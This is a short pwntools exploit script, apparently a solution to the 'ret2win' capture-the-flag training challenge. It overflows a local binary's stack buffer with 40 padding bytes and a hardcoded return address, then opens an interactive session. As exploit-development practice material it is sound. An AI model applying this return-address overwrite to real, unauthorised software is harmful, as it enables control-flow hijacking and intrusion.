from pwn import *

context.binary = "./ret2win"
context.log_level = 'debug'

ret2win_addr = 0x400756

offset = 40

payload = b"A" * offset + p64(ret2win_addr)

print("Payload length:", len(payload))  # should be 48
print("Payload (hex):", payload.hex())

p = process("./ret2win")

# Send exactly the payload (no extra \n)
p.send(payload)

# Give it time to process
sleep(0.5)

p.interactive()
